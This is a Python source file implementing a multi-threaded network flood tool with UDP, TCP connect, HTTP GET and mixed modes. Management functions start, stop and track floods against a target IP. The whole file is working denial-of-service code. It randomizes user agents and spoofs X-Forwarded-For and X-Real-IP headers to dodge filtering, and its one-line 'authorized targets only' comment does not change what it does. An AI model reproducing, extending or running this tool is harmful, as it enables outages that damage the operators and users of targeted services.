# flood.py — Multi-mode flood helper (authorized targets only)
# Modes: udp | syn | http | mixed  (best logic combined)
import socket, threading, os, time, random, string

DEFAULT_DURATION = 30
DEFAULT_THREADS = 50
DEFAULT_PORTS = [80, 443, 53, 123, 8080]

_ACTIVE = {}
_LOCK = threading.Lock()


# ───────────────────────── payloads ─────────────────────────
def _rand_str(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


def _http_req(host, path="/"):
    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/119.0 Mobile",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Safari/17.0",
    ])
    return (
        f"GET {path}?r={_rand_str(8)} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: */*\r\n"
        f"Accept-Language: en-US,en;q=0.9\r\n"
        f"Connection: keep-alive\r\n"
        f"Cache-Control: no-cache\r\n"
        f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        f"X-Real-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        f"\r\n"
    ).encode()


# ───────────────────────── workers ─────────────────────────
def _udp_worker(family, ip, ports, stop, cnt):
    try:
        s = socket.socket(family, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        payloads = [os.urandom(random.randint(512, 1400)) for _ in range(8)]
        while time.time() < stop:
            for p in ports:
                if time.time() >= stop: break
                try:
                    tgt = (ip, p, 0, 0) if family == socket.AF_INET6 else (ip, p)
                    s.sendto(payloads[cnt[0] % 8], tgt)
                    cnt[0] += 1
                except Exception:
                    pass
        s.close()
    except Exception:
        pass


def _tcp_syn_worker(family, ip, ports, stop, cnt):
    """TCP CONNECT flood (SYN behaviour via non-blocking connect)."""
    while time.time() < stop:
        for p in ports:
            if time.time() >= stop: break
            try:
                s = socket.socket(family, socket.SOCK_STREAM)
                s.setblocking(False)
                try:
                    s.connect_ex((ip, p))
                    cnt[0] += 1
                except Exception:
                    pass
                s.close()
            except Exception:
                pass


def _http_worker(family, ip, ports, stop, cnt):
    host = ip
    while time.time() < stop:
        for p in ports:
            if time.time() >= stop: break
            try:
                s = socket.socket(family, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, p))
                req = _http_req(host, "/" + _rand_str(5))
                for _ in range(3):  # pipelined requests per socket
                    s.sendall(req)
                    cnt[0] += 1
                s.close()
            except Exception:
                pass


def _mixed_worker(family, ip, ports, stop, cnt):
    """Rotate UDP / TCP / HTTP per iteration."""
    pick = random.choice([_udp_worker, _tcp_syn_worker, _http_worker])
    pick(family, ip, ports, stop, cnt)


# ───────────────────────── manager ─────────────────────────
def start_flood(ip, port=None, duration=DEFAULT_DURATION, threads=DEFAULT_THREADS,
                ports=None, mode="mixed"):
    """
    Compatible with old call: start_flood(ip, port, ports=[..])
    Extra: mode = "udp" | "syn" | "http" | "mixed"  (default: mixed)
    """
    if ports:
        plist = [int(p) for p in ports if str(p).strip().isdigit()]
    elif port:
        plist = [int(port)]
    else:
        plist = list(DEFAULT_PORTS)
    if not plist:
        plist = list(DEFAULT_PORTS)

    workers = {"udp": _udp_worker, "syn": _tcp_syn_worker,
               "http": _http_worker, "mixed": _mixed_worker}
    worker = workers.get(mode, _mixed_worker)

    family = socket.AF_INET6 if ":" in ip else socket.AF_INET
    stop = time.time() + duration

    with _LOCK:
        if ip in _ACTIVE:
            return {"ok": False, "error": "Flood already running for " + ip,
                    "ip": ip, "threads": 0, "duration": 0, "ports": plist}
        cnt = [0]
        _ACTIVE[ip] = {"stop": stop, "sent": cnt, "threads": [], "mode": mode}

    for _ in range(threads):
        t = threading.Thread(target=worker, args=(family, ip, plist, stop, cnt), daemon=True)
        t.start()
        _ACTIVE[ip]["threads"].append(t)

    def _cleanup():
        time.sleep(duration + 1)
        with _LOCK:
            _ACTIVE.pop(ip, None)
    threading.Thread(target=_cleanup, daemon=True).start()

    return {"ok": True, "ip": ip, "ports": plist, "threads": threads,
            "duration": duration, "mode": mode}


def stop_flood(ip):
    with _LOCK:
        entry = _ACTIVE.pop(ip, None)
    if not entry:
        return {"ok": False, "error": "No active flood for " + ip}
    entry["stop"] = 0
    return {"ok": True, "ip": ip, "sent_so_far": entry["sent"][0]}


def flood_status(ip):
    with _LOCK:
        entry = _ACTIVE.get(ip)
    if not entry:
        return {"ok": False, "error": "No active flood"}
    return {"ok": True, "ip": ip, "sent": entry["sent"][0],
            "mode": entry.get("mode", "?"),
            "remaining": max(0, int(entry["stop"] - time.time()))}


def list_floods():
    with _LOCK:
        return [{"ip": k, "sent": v["sent"][0],
                 "mode": v.get("mode", "?"),
                 "remaining": max(0, int(v["stop"] - time.time()))}
                for k, v in _ACTIVE.items()]
